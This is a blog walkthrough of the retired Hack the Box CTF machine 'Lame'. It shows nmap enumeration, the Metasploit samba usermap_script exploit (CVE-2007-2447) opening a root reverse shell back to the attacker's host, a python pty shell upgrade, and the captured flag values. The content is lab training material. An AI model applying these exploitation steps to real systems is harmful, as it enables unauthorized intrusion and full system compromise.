---
title: Lame, Hack the Box CTF Walkthrough
description: Abusing SMB with metasploit to achieve root compromise of a linux machine
tag: CTF
image: /assets/img/posts/2021-01-11-lame-hack-the-box-walkthrough/lame.png
layout: post
description: "Abusing SMB with metasploit to achieve root compromise of a linux machine"
date:   2021-01-10 20:01:21 -0400
last-updated: 2021-01-10 20:01:21 -0400
tag: ctf
author: Tyler Butler
---


Lame is an easy level retired capture the flag machine from Hack the Box. This writeup will describe the techniques I used to bypass security controls and gain root access to the machine.

## Getting Started   
After connecting to the hack the box network via openvpn, the first thing I did was use a basic nmap scan to search for the top 200 open ports. The scan shows 4 open ports running services including ftp, ssh, netbiod, and microsoft-ds.


```
┌──(kali㉿kali)-[~/Documents/htb/lame]
└─$ nmap --top-ports 200 -Pn 10.10.10.3                                                    
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-11 09:00 EST
Nmap scan report for 10.10.10.3
Host is up (0.030s latency).
Not shown: 196 filtered ports
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 2.86 seconds
```    

Next, to get a more detailed view of the open ports and services, as well as to check the service versions for common vulnerabilities, I used the [nmap automator](https://github.com/21y4d/nmapAutomator) script. The output below is snipped to include only the most relevant information from the scan.

```
┌──(kali㉿kali)-[~/Documents/htb/lame]
└─$ nmapAutomator.sh 10.10.10.3 All  
---------------------Starting Nmap Basic Scan---------------------
                                                                                                                                                           
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-07 08:52 EST
Nmap scan report for 10.10.10.3
Host is up (0.022s latency).

PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.6
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 2h34m32s, deviation: 3h32m09s, median: 4m31s
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2021-01-07T08:57:39-05:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 58.81 seconds



----------------------Starting Nmap UDP Scan----------------------
                                                                                                                                                           



---------------------Starting Nmap Full Scan----------------------
                                                                                                                                                           
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-07 08:53 EST
Initiating Parallel DNS resolution of 1 host. at 08:53
Completed Parallel DNS resolution of 1 host. at 08:53, 6.51s elapsed
Initiating Connect Scan at 08:53
Scanning 10.10.10.3 [65535 ports]
Discovered open port 139/tcp on 10.10.10.3
Discovered open port 445/tcp on 10.10.10.3
Discovered open port 22/tcp on 10.10.10.3
Discovered open port 21/tcp on 10.10.10.3
Connect Scan Timing: About 11.50% done; ETC: 08:58 (0:03:59 remaining)
Connect Scan Timing: About 22.92% done; ETC: 08:58 (0:03:25 remaining)
Connect Scan Timing: About 34.35% done; ETC: 08:58 (0:02:54 remaining)
Connect Scan Timing: About 45.77% done; ETC: 08:58 (0:02:23 remaining)
Connect Scan Timing: About 57.20% done; ETC: 08:58 (0:01:53 remaining)
Connect Scan Timing: About 68.63% done; ETC: 08:58 (0:01:23 remaining)
Discovered open port 3632/tcp on 10.10.10.3
Connect Scan Timing: About 80.05% done; ETC: 08:58 (0:00:53 remaining)
Completed Connect Scan at 08:58, 262.69s elapsed (65535 total ports)
Nmap scan report for 10.10.10.3
Host is up (0.026s latency).
Not shown: 65530 filtered ports
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3632/tcp open  distccd

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 269.28 seconds


Making a script scan on extra ports: 3632
                                                                                                                                                           
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-07 08:58 EST
Nmap scan report for 10.10.10.3
Host is up (0.022s latency).

PORT     STATE SERVICE VERSION
3632/tcp open  distccd distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.18 seconds



---------------------Starting Nmap Vulns Scan---------------------
                                                                                                                                                           
Running CVE scan on all ports
                                                                                                                                                           
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-07 08:58 EST
Nmap scan report for 10.10.10.3
Host is up (0.023s latency).

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.55 seconds


Running Vuln scan on all ports
                                                                                                                                                           
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-07 08:58 EST
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 10.10.10.3
Host is up (0.035s latency).

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
|_sslv2-drown: 
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
| distcc-cve2004-2687: 
|   VULNERABLE:
|   distcc Daemon Command Execution
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2004-2687
|     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)
|       Allows executing of arbitrary commands on systems running distccd 3.1 and
|       earlier. The vulnerability is the consequence of weak service configuration.
|       
|     Disclosure date: 2002-02-01
|     Extra information:
|       
|     uid=1(daemon) gid=1(daemon) groups=1(daemon)
|   
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-2687
|       https://nvd.nist.gov/vuln/detail/CVE-2004-2687
|_      https://distcc.github.io/security.html
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```  

The nmapAutomator scan revealed a lot of interesting information about the target, including a likely vulnerbility. Instead of using the identifed vulnerabilites, I instead opted to go after the smb service, which I noted was a vulnerable version.  

```
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
```  

After doing some quick research with searchsploit and exploit-db, I confirmed that the current smb version in use is vulnerable to a public exploit on metasploit. Below is the high level details on the multi/samba/usermap_script metasploit module.

```
msf6 exploit(multi/samba/usermap_script) > info

       Name: Samba "username map script" Command Execution
     Module: exploit/multi/samba/usermap_script
   Platform: Unix
       Arch: cmd
 Privileged: Yes
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 2007-05-14

Provided by:
  jduck <jduck@metasploit.com>

Available targets:
  Id  Name
  --  ----
  0   Automatic

Check supported:
  No

Basic options:
  Name    Current Setting  Required  Description
  ----    ---------------  --------  -----------
  RHOSTS  10.10.10.3       yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
  RPORT   139              yes       The target port (TCP)

Payload information:
  Space: 1024

Description:
  This module exploits a command execution vulnerability in Samba 
  versions 3.0.20 through 3.0.25rc3 when using the non-default 
  "username map script" configuration option. By specifying a username 
  containing shell meta characters, attackers can execute arbitrary 
  commands. No authentication is needed to exploit this vulnerability 
  since this option is used to map usernames prior to authentication!

References:
  https://cvedetails.com/cve/CVE-2007-2447/
  OSVDB (34700)
  http://www.securityfocus.com/bid/23972
  http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=534
  http://samba.org/samba/security/CVE-2007-2447.html

msf6 exploit(multi/samba/usermap_script) > 
```  

I configured the necessary options including setting the target host/port and the local host/port. Executing the exploit started a reverse shell on the target as the root user.   

```
msf6 exploit(multi/samba/usermap_script) > exploit

[*] Started reverse TCP handler on 10.10.14.3:4444 
[*] Command shell session 1 opened (10.10.14.3:4444 -> 10.10.10.3:55731) at 2021-01-11 09:16:25 -0500

whoami
root
pwd
/
```  

Next, i upgraded my shell using python in order to get a more functioning shell.   

```
msf6 exploit(multi/samba/usermap_script) > exploit

[*] Started reverse TCP handler on 10.10.14.3:4444 
[*] Command shell session 1 opened (10.10.14.3:4444 -> 10.10.10.3:55731) at 2021-01-11 09:16:25 -0500

whoami
root
pwd
/
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
export TERM=xterm
export SHELL=bash
python -c 'import pty;pty.spawn("/bin/bash")'
root@lame:/# 
```  

With a more functioning shell, I used the `find` command to search for the root.txt and user.txt flags.

```
root@lame:/# find -name "root.txt"
find -name "root.txt"
./root/root.txt
root@lame:/# cat ./root/root.txt
cat ./root/root.txt
4b3e6cf4cb133a8c6a5e193ebeb9a36d
root@lame:/# 
```  

```
root@lame:/# find -name "user.txt"
find -name "user.txt"
./home/makis/user.txt
root@lame:/# cat ./home/makis/user.txt
cat ./home/makis/user.txt
0764d3dbd16c1f97e559220861a12fe9
root@lame:/# 
```

## Conclusion  
Overall this was a fairly straight forward CTF machine vulnerable to a very popular metasploit exploit.